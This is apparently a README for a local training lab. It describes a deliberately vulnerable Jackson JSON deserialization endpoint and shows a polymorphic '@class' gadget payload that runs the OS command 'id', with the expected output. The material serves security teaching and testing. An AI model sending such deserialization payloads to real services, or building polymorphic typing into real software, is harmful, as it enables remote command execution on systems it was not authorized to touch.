# Jackson: only `resp` in the HTTP response

The Jackson service on `http://127.0.0.1:8081` accepts **raw JSON** at `POST /api/deserialize`. Both examples use the same endpoint and the same **Run** button.

## Normal JSON

```json
{"@class":"java.util.LinkedHashMap","message":"hello"}
```

Expected HTTP response:

```json
{"resp":"hello"}
```

## Custom gadget command-execution example

```json
{"@class":"lab.WorkflowEnvelope","router":{"@class":"lab.TaskRouter","action":{"@class":"lab.ProcessAction","command":"id"}}}
```

Expected HTTP response *if the OS process executes successfully* (UID/GID varies):

```json
{"resp":"uid=10001(lab) gid=999(lab) groups=999(lab)"}
```

Only actual lines emitted as `[os stdout]` are included in `resp`; there is no fabricated success output. Gadget debug traces are no longer exposed via this HTTP response. Errors also use `{ "resp": "Error: ..." }` with corresponding HTTP status for validation exceptions.

Rebuild the Jackson service:

```powershell
docker compose up -d --build --force-recreate java
```

The gadget classes are purpose-built training classes, **not** an XBean CVE-2020-8840 exploit.
